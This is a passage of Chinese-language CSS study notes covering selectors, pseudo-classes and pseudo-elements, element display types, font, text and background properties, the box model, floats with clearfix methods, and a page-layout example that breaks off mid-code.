1.标签选择器最大的优点是能快速为页面中同类型的标签统一样式，同时这也
是他的缺点，不能设计差异化样式
2.标签名（p）{属性1:属性值1; 属性2:属性值2; 属性3:属性值3; }
```
>[danger] ##### 类选择器
```
1.类选择器使用“.”（英文点号）进行标识，后面紧跟类名，标签调用的时候用 
class=“类名”  即可。
2..类名{属性1:属性值1; 属性2:属性值2; 属性3:属性值3; }
```
* 名技巧
```
1.长名称或词组可以使用中横线来为选择器命名。
2.不建议使用“_”下划线来命名CSS选择器。
3.不要纯数字、中文等命名， 尽量使用英文字母来表示。
```
>[danger] ##### id选择器
```
1.该语法中，id名即为HTML元素的id属性值，大多数HTML元素都可以定义
id属性，元素的id值是唯一的，只能对应于文档中某一个具体的元素。
2.#id名{属性1:属性值1; 属性2:属性值2; 属性3:属性值3; }
```
>[danger] ##### 通配符选择器
```
1.通配符选择器用“*”号表示，他是所有选择器中作用范围最广的，能匹配页
面中所有的元素。
2.* { 属性1:属性值1; 属性2:属性值2; 属性3:属性值3; }
```

[TOC]

 
>[success] # 伪类选择器 
```
1.css2 -- 的连接伪类选着器
2.css3 -- 结构伪类选择器
```
>[danger] ##### 伪类选择器
```
- :link      /* 未访问的链接 */
- :visited   /* 已访问的链接 */
- :hover     /* 鼠标移动到链接上 */
- :active    /* 选定的链接 */
```
>[danger] ##### css3 -- 结构(位置)伪类选择器
* n正常计数从一开始，但是当作为公式的时候从0开始（详细看文档详解篇章）
```
- :first-child :选取属于其父元素的首个子元素的指定选择器
- :last-child :选取属于其父元素的最后一个子元素的指定选择器
- :nth-child(n) ： 匹配属于其父元素的第 N 个子元素，不论元素的类型
- :nth-last-child(n) ：选择器匹配属于其元素的第 N 个子元素的每个元素，不论元素的类型，从最后一个子元素开始计数。
  n 可以是数字、关键词或公式
-.E:nth-child(even) --- 所有的偶数
-.E:nth-child(odd) --- 所有的奇数
```
```
li:first-child { /*  选择第一个孩子 */
        		color: pink; 
        	}
li:last-child {   /* 最后一个孩子 */
        		color: purple;
        	}
li:nth-child(4) {   /* 选择第4个孩子  n  代表 第几个的意思 */ 
				color: skyblue;
        	}
```
>[danger] ##### css3 -- 目标伪类选择器
* 具体案例可以看手册
```
1. :target目标伪类选择器 :选择器可用于选取当前活动的目标元素
2. :target {
		color: red;
		font-size: 30px;
}
3.这个是配合锚点使用，当a标签锚点触发对应目标内容，对应的目标内容做的样式变化
```

>[success] # 复合选择器
```
1.单单只是使用基本选择器在一些场景是无法达到我们所需要的需求
2.复合选择器是由两个或多个基础选择器，通过不同的方式组合而成的,目的是为了
可以选择更准确更精细的目标元素标签。
3.交集选择器
4.并集选着器
5.后代选着器
6.子代选择器
```
>[danger] ##### 交集选择器
![](https://box.kancloud.cn/edae2d868eaffae5215254e2722c3cf2_438x148.png)
```
1.交集选择器由两个选择器构成,两个选择器之间不能有空格
2.交集选择器 是 并且的意思。  即...又...的意思

p.one {color:"#f00";}
<p class="one"> 交集选着器 </p>
```
>[danger] ##### 并集选择器
![](https://box.kancloud.cn/331757c1bec1ec6cc75def5d45ea046d_428x152.png)
```
1.并集选择器（CSS选择器分组）是各个选择器通过<strong style="color:#f00">逗
号</strong>连接而成的，任何形式的选择器（包括标签选择器、class类选择器id选
择器等），都可以作为并集选择器的一部分。如果某些选择器定义的样式完全相
同，或部分相同，就可以利用并集选择器为它们定义相同的CSS样式。
2.并集选择器  和 的意思，  就是说，只要逗号隔开的，所有选择器都会执行后面样式。
3.比如  .one, p , #test {color: #F00;}  表示   .one 和 p  和 #test 这三个选择器都会
执行颜色为红色。  通常用于集体声明。
```
>[danger] ##### 后代选择器
![](https://box.kancloud.cn/2e870784ac9dacb2e4776fed18d96f53_415x153.png)
```
1.后代选择器又称为包含选择器，用来选择元素或元素组的后代，其写法就是把外
层标签写在前面，内层标签写在后面，中间用空格分隔。当标签发生嵌套时，内
层标签就成为外层标签的后代。
2.子孙后代都可以这么选择。 或者说，它能选择任何包含在内 的标签。 
```
>[danger] ##### 子元素选择器
![](https://box.kancloud.cn/be502b851adcdb18543d168ba9e4e0b8_427x145.png)
```
1.子元素选择器只能选择作为某元素子元素的元素。其写法就是把父级标签写在前
面，子级标签写在后面，中间跟一个>进行连接，注意，符号左右两侧各保留
一个空格。 
2. 这里的子 指的是 亲儿子  不包含孙子 重孙子之类。
3. demo > h3 {color: red;}   说明  h3 一定是demo 亲儿子。  demo 元素包含着h3。
```
>[success] # 属性选择器
```
1.根据标签中的属性最为选择器的定位
```
>[danger] ##### 属性选择器
| 选择器               | 含义                              |
| - | - | - |
| E[attr]     |   存在attr属性即可                    |
| E[attr=val]   |  属性值完全等于val                   |
| E[attr\*=val]|   属性值里包含val字符并且在“任意”位置 |
| E[attr^=val]  |  属性值里包含val字符并且在“开始”位置 |
| E[attr$=val]  |    属性值里包含val字符并且在“结束”位置 |
>[danger] ##### 案例
```
/* 获取到 拥有 该属性的元素 */
li[type] {
  border: 1px solid gray;
}
/* 获取 属性等于某个值的 元素 属性值 可以使用 引号进行包裹 */
li[type="vegetable"] {
  background-color: green;
}
/* 使用空格分隔的 多个属性 其中有某个属性即可获取 */
li[type~="hot"] {
  font-size: 40px;
}
/* 获取以某个属性开头的语法  */
li[color^='green'] {
  background-color: orange;
}
/* 获取以某个值 结尾的属性 */
li[type$='t']{
  color: hotpink;
  font-weight: 900;
}

/* 获取 属性中 拥有某个值的 元素 */
li[type*=ea] {
  font-size: 100px;
}
/*  如果属性的值 只有very 也能够获取  用来获取 多个属性 并且 使用-连接 */
li[price|='very'] {
  background-color: darkred;
}

<ul>
  <li type='fruit' color='green'>西瓜</li>
  <li type='vegetable' color='greenyellow'>西兰花</li>
  <li type='meat'>牛肉</li>
  <li type='meat hot'>猪肉</li>
  <li type='drink hot'>可乐</li>
  <li type='drink hot'>雪碧</li>
  <li price='very-cheap'>红酒</li>
  <li price='very'>白酒</li>
</ul>
```
>[success] # 伪元素选择器
```
1. E::first-letter文本的第一个单词或字（如中文、日文、韩文等）
2. E::first-line 文本第一行；
3. E::selection 可改变选中文本的样式；
4. E::before和E::after  在E元素内部的开始位置和结束位创建一个元素，该元素为行内元素，且必须要结合content属性使用
5. 双冒号
6. 伪元素:before和:after添加的内容默认是inline元素**；这个两个伪元素的
content属性，表示伪元素的内容,设置:before和:after时必须设置其
content属性，否则伪元素就不起作用。
```
* 更多产看本文档案例
```
/* 首行第一个字样式 */
p::first-letter {
  font-size: 20px;
  color: hotpink;
}

/* 首行特殊样式 */
p::first-line {
  color: skyblue;
}

/* 鼠标滑选中的样式*/
p::selection {
  /* font-size: 50px; */
  color: orange;
}
```
>[danger] ##### before / after
```
1.E:after、E:before 在旧版本里是伪元素，CSS3的规范里“:”用来表示伪类，“::”用
来表示伪元素，但是在高版本浏览器下E:after、E:before会被自动识别为
E::after、E::before，这样做的目的是用来做兼容处理。
2.通过下面案例得知，before/after 在div 内容前后插入自己的内容
```
* 显示效果 ：前插入 我是原本内容 后插入
```
<style>
    div::after{
        content: '后插入';
    }
    div::before{
        content: '前插入';
    }
</style>
    </head>
<body>
<div>
我是原本内容
</div>
```
[TOC]
 
>[success] # 标签元素三种分类
```
1.块级元素  -- block
2.行内元素  -- inline
3.行内块    -- inline-block
```
>[danger] ##### 块级元素
```
1.每个块元素通常都会独自占据一整行或多整行，可以对其设置宽度、高度、对齐
等属性，常用于网页布局和网页结构的搭建
2.常见的块元素有<h1>~<h6>、<p>、<div>、<ul>、<ol>、<li>等，其中<div>标签
是最典型的块元素。
```
* 特点
```
  （1）总是从新行开始
  （2）高度，行高、外边距以及内边距都可以控制。
※（3）宽度默认是容器的100%
  （4）可以容纳内联元素和其他块元素。
```
>[danger] ##### 行内元素
```
1.行内元素（内联元素）不占有独立的区域，仅仅靠自身的字体大小和图像尺寸来
支撑结构，一般不可以设置宽度、高度、对齐等属性，常用于控制页面中文本的
样式。
2.常见的行内元素有<a>、<strong>、<b>、<em>、<i>、<del>、<s>、<ins>、
<u>、<span>等，其中<span>标签最典型的行内元素。
```
* 特点
```
  （1）和相邻行内元素在一行上。
※（2）高、宽无效，但水平方向的padding和margin可以设置，垂直方向的无效。
  （3）默认宽度就是它本身内容的宽度。
  （4）行内元素只能容纳文本或则其他行内元素。（a特殊）
```
>[danger] ##### 行内块
```
1.在行内元素中有几个特殊的标签——<img />、<input />、<td>，可以对它们设
置宽高和对齐属性。
```
* 特点
```
（1）和相邻行内元素（行内块）在一行上,但是之间会有空白缝隙。
（2）默认宽度就是它本身内容的宽度。
（3）高度，行高、外边距以及内边距都可以控制。
```
>[danger] ##### 注意点
```
1. 只有 文字才 能组成段落  因此 p  里面不能放块级元素，同理还有这些标签h1,h2,h3,h4,h5,h6,dt，他们都是文字类块级标签，里面不能放其他块级元素。
2. 链接里面不能再放链接。
```
[TOC]
>[success] # font -- 字体
* 配合本文档字体详情了解更多，配合手册使用
```
1.font-style  -- 字体的样式normal|italic|oblique ，对应 正常|倾斜|倾斜
2.font-variant -- 将小写字母转换成大写normal | small-caps
，正常|小写字母转大写
3.font-weight  -- 字体粗细 normal | bold | bolder | lighter | <integer>
，正常|粗体|特粗|特细|数字规定(400/700,正常/加粗)
4.font-size   -- 字文本体大小
5.line-height -- 文本字体的行高 
6.font-family -- 问题字体选择列如宋体，微软雅黑
7.color -- 设置颜色
```
>[danger] ##### font-size 字体大小详解
```
1.font-size属性用于设置字号，该属性的值可以使用相对长度单位，也可以
使用绝对长度单位。其中，相对长度单位比较常用，推荐使用像素单位px，
p{font-size:16px;}
```
![](https://box.kancloud.cn/095ecb28e593aeaafb2ead282e67832e_607x312.png)
>[danger] ##### font-famliy -- 字体详解
```
1.font-family属性用于设置字体。网页中常用的字体有宋体、微软雅黑、黑
体等p{ font-family:"微软雅黑";}
2.可以同时指定多个字体，中间以逗号隔开，表示如果浏览器不支持第一
字体，则会尝试下一个，直到找到合适的字体。
```
* 技巧
```
1. 现在网页中普遍使用14px+。
2. 尽量使用偶数的数字字号。ie6等老式浏览器支持奇数会有bug。
3. 各种字体之间必须使用英文状态下的逗号隔开。
4. 中文字体需要加英文状态下的引号，英文字体一般不需要加引号。当需要设置英文字体时，英文字体名必须位于中文字体名之前。
5. 如果字体名中包含空格、#、$等符号，则该字体必须加英文状态下的单引号或双引号，例如font-family: "Times New Roman";。
6. 尽量使用系统默认字体，保证在任何用户的浏览器中都能正确显示。
```
* 字体的Unicode 写法（看总结的 详细篇章）
```
1.在 CSS 中设置字体名称，直接写中文是可以的。但是在文件编码
（GB2312、UTF-8 等）不匹配时会产生乱码的错误。xp 系统不支持 类似
微软雅黑的中文。
方案一： 你可以使用英文来替代。 比如 font-family:"Microsoft Yahei"。
方案二： 在 CSS 直接使用 Unicode 编码来写字体名称可以避免这些错误。
使用 Unicode 写中文字体名称，浏览器是可以正确的解析的。
font-family: "\5FAE\8F6F\96C5\9ED1"，表示设置字体为“微软雅黑”
2.为了照顾不同电脑的字体安装问题，我们尽量只使用宋体和微软雅黑中文字体
```
>[danger] ##### font-weight -- 字体粗细详解
```
1.数字 400 等价于 normal，而 700 等价于 bold。  但是我们更喜欢用数字来表示。  
2.等同的标签b  和 strong 
```
>[danger] ##### font-style -- 字体倾斜
```
1.字体倾斜除了用 i  和 em 标签之外，可以使用CSS 来实现，但是CSS 是
没有语义的。
```
>[danger] ##### 字体的综合 -- 缩写
```
1.选择器{font: font-style  font-weight  font-size/line-height  font-family;}，字
体是否倾斜，字体粗细，字体的大小/行高，字体种类
2.注意：其中不需要设置的属性可以省略（取默认值），但必须保留
font-size和font-family属性，否则font属性将不起作用。
```
[TOC]

 
>[success] #  文本
* 更多查看手册
```
1.color -- 设置文本颜色，也可以设置字体透明度
2.line-height -- 设置行高
3.text-align  -- 水平对齐方式
4.text-indent -- 首行缩进
5.letter-spacing -- 字体间距
6.word-spacing -- 单词间距
7.text-shadow -- 文字阴影
8.text-decoration -- 装饰文本，可以设置文本上加线
```
>[danger] ##### 设置文本颜色/和透明度 -- color
```
1.颜色是三原色，所以从红黄蓝构成颜色  / red，green，blue（rgb）
2.用十六进制控制颜色，0是最小值，f是最大值。#000/#fff  黑色/白色，光的颜色
3.RGB代码设置，rgb(255,0,0)或rgb(100%,0%,0%)
4.设置透明度color: rgba(r,g,b,a)  a 是alpha  透明的意思  取值范围 0~1之间    
color: rgba(0,0,0,0.3) 
5.以后颜色尽量是十六进制 我们提倡简写格式，#ffffff  #fff     #00ff00   #0f0
#ff00fe  这个就不能简写

需要注意的是，如果使用RGB代码的百分比颜色值，取值为0时也不能省略百分
号，必须写为0%。
```
>[danger] ##### 设置行高(垂直居中) --  line-height
```
1.line-height属性用于设置行间距，就是行与行之间的距离，即字符的垂直间距，
一般称为行高。line-height常用的属性值单位有三种，分别为像素px，相对值em
和百分比%，实际工作中使用最多的是像素px
一般情况下，行距比字号大7.8像素左右就可以了。
```
>[danger] ##### text-indent -- 首行缩进
```
1.text-indent属性用于设置首行文本的缩进，其属性值可为不同单位的数值、em
字符宽度的倍数、或相对于浏览器窗口宽度的百分比%，允许使用负值, 建议使用
em作为设置单位。
2.1em 就是一个字的宽度   如果是汉字的段落， 1em 就是一个汉字的宽度
text-indent: 2em;  /* 此时2em 就是2个汉字的宽度 */
```
>[danger] ##### letter-spacing -- 字间距
```
1.letter-spacing属性用于定义字间距，所谓字间距就是字符与字符之间的空白。
其属性值可为不同单位的数值，允许使用负值，默认为normal。
```
>[danger] ##### word-spacing -- 单词间距
```
1.word-spacing属性用于定义英文单词之间的间距，对中文字符无效。和letter-
spacing一样，其属性值可为不同单位的数值，允许使用负值，默认为normal。
2.word-spacing和letter-spacing均可对英文进行设置。不同的是letter-spacing定义
的为字母之间的间距，而word-spacing定义的为英文单词之间的间距。
```
>[danger] ##### text-shadow -- 文字阴影
* 文档直接产看或者本文档对应专属位置
```
1.text-shadow:水平位置 垂直位置 模糊距离 阴影颜色;
2.前两项是必须写的。  后两项可以选写
```
>[danger] ##### text-decoration -- 装饰文本
```
1.text-decoration：<' text-decoration-line '> || <' text-decoration-style '> || <' text-decoration-color '>
2. <' text-decoration-line '>： 指定文本装饰的种类。相当于CSS2.1的
   <' text-decoration '> 属性，可取值：none | underline | overline | line-through | 
  blink ，无样式，下划线，上划线，文字穿过，闪烁（然而并没有用因为没开发）
   <' text-decoration-style '>： 指定文本装饰的样式。（可以波浪线下划线等，更多见文档） 
   <' text-decoration-color '>： 指定文本装饰的颜色。 
```
[TOC]
 
>[success] # background -- 背景
```
1.background-color -- 设置背景颜色
2.background-image -- 设置背景图片
3.background-repeat -- 设置平铺
4.background-position -- 设置背景位置
5.background-attachment -- 设置背景图片固定还是滚动
6.background-size -- 背景缩放(CSS3)
```
>[danger] ##### background-image -- 背景图片
```
1.background-image : none | url (url)  
参数：
none : 　无背景图（默认的）
url : 　使用绝对或相对地址指定背景图像 
2.background-image 属性允许指定一个图片展示在背景中（只有CSS3才可以多背
景）可以和 background-color 连用。 如果图片不重复地话，图片覆盖不到地地方
都会被背景色填充。 如果有背景图片平铺，则会覆盖背景颜色。
```
* 技巧
```
1.背景图片后面的地址，url不要加引号。background-mage:url(images/l.jpg);
```
>[danger] ##### background-repeat -- 设置平铺
```
1.background-repeat : repeat | no-repeat | repeat-x | repeat-y 
参数：
repeat : 　   背景图像在纵向和横向上平铺（默认的）
no-repeat : 　背景图像不平铺
repeat-x : 　背景图像在横向上平铺
repeat-y : 　背景图像在纵向平铺 
设置背景图片时，默认把图片在水平和垂直方向平铺以铺满整个元素。
```
>[danger] ##### background-position -- 设置背景图片位置
```
1.background-position : length || length 或 background-position : position || position 
参数：
length : 　百分数 | 由浮点数字和单位标识符组成的长度值。请参阅长度单位 
position : 　top | center | bottom | left | center | right 
解释：
1.length 利用坐标定位，默认是0% 0%，依次是x，y轴，如果 只写一个那么垂直距离默认50%，也可以用px 定位，不过默认是百分比定位
2.position 利用方位词定位，默认是left top 左上，如果方位名词只写一个，另外一个默认为center 
3.也可以方位词和数字混搭使用
案例：
    background-position: left top;   默认的是 左上角 
    background-position: bottom right ;   方位名词没有顺序，谁在前都可以 
    background-position: center center ;  
    background-position: left;   如果方位名词只写一个，另外一个默认为center 
    background-position: 10px 30px; 
    background-position: center 10px ;
```
* 实际工作技巧
```
1.实际工作用的最多的，就是背景图片居中对齐了。由于为了适配各种屏幕大小，
一般美工会做的图片会比较大，为了能在小屏幕中更好显示，因此使用下面写法
，让背景图片水平居中，-25px 是根据具体需求来设置
/* 背景图片的位置  水平居中  垂直靠上就可以了 */
background-position: center -25px;
```
>[danger] ##### background-attachment -- 背景附着
```
1.background-attachment : scroll | fixed 
参数： 
scroll : 　背景图像是随对象内容滚动（默认背景图片会跟着浏览器滚动）
fixed : 　 背景图像固定 （背景图片固定只有内容滚动）
说明： 
设置或检索背景图像是随对象内容滚动还是固定的。
```
>[danger] ##### background -- 缩写
```
1.缩写不像font ，background的缩写可以打乱顺序，但最好按照下面格式写
background: #000 url(images/ms.jpg) no-repeat fixed center -25px;
2.上面依次是背景颜色，地址，是否平铺，背景是否滚动，背景位置
```
>[danger] #####  rgba 背景透明（css3）
```
1.background: rgba(0,0,0,0.3);
2. 最后一个参数是alpha 透明度  取值范围 0~1之间
3.注意：背景半透明是指盒子背景半透明， 盒子里面的内容不收影响。
4.同样，可以给 文字和边框透明  都是 rgba 的格式来写。
  color:rgba(0,0,0,0.3);
  border: 1px solid rgba(0,0,0,0.3);
```
>[danger] ##### background-size -- 背景缩放（css3）
```
1.通过background-size设置背景图片的尺寸，就像我们设置img的尺寸一样，在移
动Web开发中做屏幕适配应用非常广泛。
其参数设置如下：
a) 可以设置长度单位(px)或百分比（设置百分比时，参照盒子的宽高）
b) 设置为cover时，会自动调整缩放比例，保证图片始终填充满背景区域，如有溢出部分则会被隐藏。
c) 设置为contain会自动调整缩放比例，保证图片始终完整显示在背景区域。
    background-image: url('images/gyt.jpg');
    background-size: 300px 100px;
    /* background-size: contain; */
    /* background-size: cover; */
2.cover会自动调整缩放比例，保证图片始终填充满背景区域，如有溢出部分则会被隐藏
图片进行等比例缩放 图片一定要保证宽度和高度同时满足盒子的大小 势必会有部
分超出去，就看不见了  我们平时用的cover 最多
3.会自动调整缩放比例，保证图片始终完整显示在背景区域。图片进行等比例缩放 
如果图片的高度或者 宽度 有一个和盒子一样大了,就不在缩放这样的好处就是保证
了图片的完整。 不会有缺失的一部分， 但是会有部分裸露
```
>[danger] ##### 多背景(CSS3)
```
1.background-image: url('images/gyt.jpg'),url('images/robot.png');
2. 一个元素可以设置多重背景图像。 
 - 每组属性间使用逗号分隔。 
 - 如果设置的多重背景图之间存在着交集（即存在着重叠关系），前面的背景图会覆盖在后面的背景图之上。
 - 为了避免背景色将图像盖住，背景色通常都定义在最后一组上
```
[TOC]

 
>[success] # 盒子模型
```
1.盒子模型就是把HTML页面中的元素看作是一个矩形的盒子，也就是一个盛
装内容的容器。每个矩形都由元素的内容、内边距（padding）、边
（border）和外边距（margin）组成。
```
>[danger] ##### 盒子边框 -- border
```
1.border : border-width || border-style || border-color 
解释：
    可以设置边框的粗细，线的样式，和线的颜色
    none：没有边框即忽略所有边框的宽度（默认值）
    solid：边框为单实线(最为常用的)
    dashed：边框为虚线
    dotted：边框为点线
    double：边框为双实线
2.border-collapse:collapse; 表示边框合并在一起。
```
```
1.我最常用的写法，border-top:1px solid #fff 或者border：1px solid #fff
```
| 设置内容     | 样式属性  | 常用属性值     |
| - | - | - |
| 上边框       | border-top-style:样式; border-top-width:宽度;border-top-color:颜色;border-top:宽度 样式 颜色; |                                                              |
| 下边框       | border-bottom-style:样式;border- bottom-width:宽度;border- bottom-color:颜色;border-bottom:宽度 样式 颜色; |                                                              |
| 左边框       | border-left-style:样式; border-left-width:宽度;border-left-color:颜色;border-left:宽度 样式 颜色; |                                                              |
| 右边框       | border-right-style:样式;border-right-width:宽度;border-right-color:颜色;border-right:宽度 样式 颜色; |                                                              |
| 样式综合设置 | border-style:上边 [右边 下边 左边];                          | none无（默认）、solid单实线、dashed虚线、dotted点线、double双实线 |
| 宽度综合设置 | border-width:上边 [右边 下边 左边];                          | 像素值                                                       |
| 颜色综合设置 | border-color:上边 [右边 下边 左边];                          | 颜色值、#十六进制、rgb(r,g,b)、rgb(r%,g%,b%)                 |
| 边框综合设置 | border:四边宽度 四边样式 四边颜色;                           |                                                              |
>[danger] ##### 圆角边框（css3） -- radius
```
1.Border-radius: 水平半径/垂直半径；  -- 画椭圆的时候可以使用
2.border-radius: 左上角  右上角  右下角  左下角; -- 正常圆角的时候使用
3.border-radius: 左上角   右下角
4.border-radius:左上角  左下角 右下角

```
* 技巧画圆形的技巧
```
1.border-radius: 50%; -- 取宽度和高度 一半  则会变成一个圆形
```
>[danger] ##### 内边距 -- padding
```
1.padding属性用于设置内边距。是指 边框与内容之间的距离。
  padding-top:上内边距
  padding-right:右内边距
  padding-bottom:下内边距
  padding-left:左内边距
```
| 值的个数 | 表达意思  |
| - | - |
| 1个值    | padding：上下左右边距 比如padding: 3px; 表示上下左右都是3像素 |
| 2个值    | padding: 上下边距 左右边距 比如 padding: 3px 5px; 表示 上下3像素 左右 5像素 |
| 3个值    | padding：上边距 左右边距 下边距 比如 padding: 3px 5px 10px; 表示 上是3像素 左右是5像素 下是10像素 |
| 4个值    | padding:上内边距 右内边距 下内边距 左内边距 比如: padding: 3px 5px 10px 15px; 表示 上3px 右是5px 下 10px 左15px 顺时针 |
>[danger] ##### 外边距 -- margin
```
1.margin属性用于设置外边距。  设置外边距会在元素之间创建“空白”， 这段空白通常不能放置其他内容。
2.margin-top:上外边距
3.margin-right:右外边距
4.margin-bottom:下外边距
5.margin-left:上外边距
6.margin:上外边距 右外边距  下外边距  左外边
7.取值顺序跟内边距相同。
```
* 小特性
```
1.使用margin定义块元素的垂直外边距时，可能会出现外边距的合并。
2.当上下相邻的两个块元素相遇时，如果上面的元素有下外边距margin-
bottom，下面的元素有上外边距margin-top，则他们之间的垂直间距不是
margin-bottom与margin-top之和，而是两者中的较大者。这种现象被称为相
邻块元素垂直外边距的合并（也称外边距塌陷）。
3.对于两个嵌套关系的块元素，如果父元素没有上内边距及边框，则父元素
的上外边距会与子元素的上外边距发生合并，合并后的外边距为两者中的较
大者，即使父元素的上外边距为0，也会发生合并。解决方法：1. 可以为父元素定义1像素的上边框或上内边距。2. 可以为父元素添加overflow:hidden。
```
>[danger] ##### 让盒子水平居中
```
1.就是设置外边距，然左右外边距自适应.header{ width:960px; margin:0 auto;}
```
>[danger] ##### 盒子计算
```
1.盒子的总宽度= width+左右内边距之和+左右边框宽度之和+左右外边距和
解释：空间尺寸:  width + border + padding + margin，内合 实际尺寸:  width + border + padding  130 
2.盒子的总高度= height+上下内边距之和+上下边框宽度之和+上下外边距之和
```
>[success] # css3 -- 盒子模型
```
1.CSS3中可以通过box-sizing 来指定盒模型，即可指定为content-box、border-box，这样我们计算盒子大小的方式就发生了改变。
可以分成两种情况：
1、box-sizing: border-box  盒子大小为 width
2、box-sizing: content-box  盒子大小为 width + padding + border
注：上面的标注的width指的是CSS属性里设置的width: length，content的值是会自动调整的。
2.使用方法 box-sizing: border-box;
```
>[success] # 盒子阴影
* 具体看详细篇章
```
1.box-shadow:水平阴影 垂直阴影 模糊距离 阴影尺寸 阴影颜色  内/外阴影；/* box-shadow:水平位置 垂直位置 模糊距离 阴影尺寸（影子大小） 阴影颜色  内/外阴影； */
2.设置上下左右的阴影，需要设置两次，用逗号隔开
box-shadow: 0 0 30px  rgba(0, 0, 0, .4), 0 0 30px  rgba(0, 0, 0, .4);
```
 
>[success] # 盒子模型布局稳定性
```
1.布局时候的优先级别按照 优先使用  宽度 （width）  其次 使用内边距（padding）    再次  外边距（margin）。   
2.  width >  padding  >   margin ，先考虑能不能宽度剩余法，也就是就，块和块的距离也看做一个块。
```
>[danger] ##### 布局流程
```
为了提高网页制作的效率，布局时通常需要遵守一定的布局流程，具体如下：
1、确定页面的版心（可视区）。
2、分析页面中的行模块，以及每个行模块中的列模块。（先分析行，在分析列）
3、制作HTML页面，CSS文件。
4、CSS初始化，然后开始运用盒子模型的原理，通过DIV+CSS布局来控制网页的各个模块。
```
>[success] # 文字、盒子水平居中
```
1.text-align: center; /*  文字居中水平 */
2.div{ width:960px; margin:0 auto;}只试用块级元素
3.行内块元素的使用
div {
        width: 200px;
        height: 200px;
        background-color: pink;
        /*transform: translate(100px)  水平移动100像素*/
        /*transform: translate(50%)  translate 如果移动的距离是%
        不是以父级宽度为准，以自己宽度为准*/
        /*transform: translate(50%);  y意思就是让div盒子 自己宽度200 的一半 走 100像素*/
        /*已让我们让定位的盒子居中对齐*/
        position: absolute;

        left: 50%; /*以父级宽度为准*/
        top: 50%;
        /*margin-left: -100px; 需要计算不合适*/
        transform: translate(-50%, -50%);
    }
```
>[success] # 背景和图片的区别
```
1.背景图片改变大小，background-size: 200px 210px; /*  背景图片更改大小只能用 background-size */
2.img 标签改变大小，width: 200px;/* 插入图片更改大小 width 和 height */
3.背景图片改变位置，background-position: 30px 50px; /* 背景图片更该位置 我用 background-position */
4.img 改变位置，margin-top: 30px;  /* 插入图片更改位置 可以用margin 或padding  盒模型 */
5.一般情况下，背景图片适合做一些小图标使用 ，产品展示之类的就用插入图片
```
[TOC]
 
>[success] # float -- 浮动
```
1.给img 标签可以文本环绕
2.普通给div 做布局使用
```
>[danger] ##### float -- 使用
```
1.元素的浮动是指设置了浮动属性的元素会脱离标准普通流的控制，移动到其父元
素中指定位置的过程。
2.在CSS中，通过float属性来定义浮动，其基本语法格式如下：选择器{float:属性值;}
```
>[danger] ##### float -- 浮动特性
```
1.浮动首先创建包含块的概念（包裹）。就是说， 浮动的元素总是找理它最近的父
级元素对齐。但是不会超出内边距的范围。
2.浮动的元素排列位置，跟上一个元素（块级）有关系。如果上一个元素有浮动，
则A元素顶部会和上一个元素的顶部对齐；如果上一个元素是标准流，则A元素的顶
部会和上一个元素的底部对齐。
3.加了浮动的元素盒子是浮起来的，漂浮在其他的标准流盒子上面。
4.加了浮动的盒子，不占位置的，它浮起来了，它原来的位置漏 给了标准流的盒子。
5.元素添加浮动后，元素会具有行内块元素的特性。元素的大小完全取决于定义的大小或者默认的内容多少
```
![](https://box.kancloud.cn/d0a8b4a989872c2ec56cfb20135d380d_507x285.png)
>[success] # 清除浮动
```
1.清除浮动主要为了解决父级元素因为子级浮动引起内部高度为0 的问题。
2.如果是标准流，宽度是父级元素，高度是内部标准流盒子撑开的高度
3.如果浮动，外面的父级盒子没有设置高度，则浮动的子元素不会将盒子的父元素
撑开，这个时候就需要清除浮动
```
![](https://box.kancloud.cn/e978fd1f8e9a55929f1e5f6296ffc0c3_626x338.png)
![](https://box.kancloud.cn/97c5fcb3f15292dd07610dde6f740138_646x199.png)
>[danger] ##### 额外标签法
```
<div style="background-color: deepskyblue;">
    <div class="two" style="float: left"></div>
    <div style="clear: both"></div>
</div>
1.选择器{clear:属性值;}
2.是W3C推荐的做法是通过在浮动元素末尾添加一个空的标签例如 <div style=”clear:both”></div>，或则其他标签br等亦可。
3.优点： 通俗易懂，书写方便
4.缺点： 添加许多无意义的标签，结构化较差。 
```
| 属性值 | 描述                                       |
| - | - |
| left   | 不允许左侧有浮动元素（清除左侧浮动的影响） |
| right  | 不允许右侧有浮动元素（清除右侧浮动的影响） |
| both   | 同时清除左右两侧浮动的影响                 |
>[danger] ##### 父级添加overflow属性方法
```
1.可以给父级添加： overflow为 hidden|auto|scroll  都可以实现。
2.优点：  代码简洁
3.缺点：  内容增多时候容易造成不会自动换行导致内容被隐藏掉，无法显示需要溢出的元素。
```
>[danger] ##### 使用after伪元素清除浮动
```
 .clearfix:after {
			content: ".";  /* 内容为小点， 尽量加不要空， 否则旧版本浏览器有空隙 */
			display: block;  /* 转换为块级元素 */
			height: 0; /* 高度为0 */
			visibility: hidden;  /* 隐藏盒子 */
			clear: both; /* 清除浮动 */
		}
		.clearfix {  /* ie6.7浏览器的处理方式 */
			*zoom: 1; 
			/*  * 代表ie6.7能识别的特殊符号  带有这个*的属性 只有ie6.7才执行  
			 zoom 就是ie6.7 清除浮动的方法 */
		}
<div class="clearfix">
	<div style="folat:right"></div>
	<div style="folat:right"></div>
</div>
1.优点： 符合闭合浮动思想  结构语义化正确
2.缺点： 由于IE6-7不支持:after，使用 zoom:1触发 hasLayout。
```
>[danger] ##### 使用before和after双伪元素清除浮动
```
.clearfix:before,.clearfix:after { 
  content:"";
  display:table;
}
.clearfix:after {
 clear:both;
}
.clearfix {
  *zoom:1;
}
<div class="clearfix">
	<div style="folat:right"></div>
	<div style="folat:right"></div>
</div>
1.优点：  代码更简洁
2.缺点：  由于IE6-7不支持:after，使用 zoom:1触发 hasLayout。
```
[TOC]

 
>[success] # 常见布局
* 先看布局盒子遵循，在看这个
```
1.一列固定宽度且居中
2.两列左窄右宽型
3.通栏平均分布型
```
* 什么是版心
```
1.“版心”是指网页中主体内容所在的区域。一般在浏览器窗口中水平居中显示，常见
的宽度值为960px、980px、1000px、1200px等这些数可以被，1 2 3 4 5 等多个数
整除。
```
>[danger] ##### 一列固定宽度且居中
![](https://box.kancloud.cn/a4186fc8cffa464d0dd4bb17dcefde32_420x394.png)
```
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <style>
		* {
			margin: 0;
			padding: 0;  /* 清除内外边距 css 第一讲句话 */
		}
		/* 相同的样式，我们会想到 并集选择器 */
		.top,
		.banner,
		.main,
		.footer {
			width: 960px;
			text-align: center; /* 文字居中对齐 */
			margin: 0 auto; /* 可以让盒子居中对齐  只要保证 左右auto就阔以了 */
			margin-bottom: 10px;
			border: 1px dashed #ccc;
		}
		.top {		
			height: 80px;
			background-color: pink;									
		}
		.banner {
			height: 120px;
			background-color: purple;
		}
		.main {
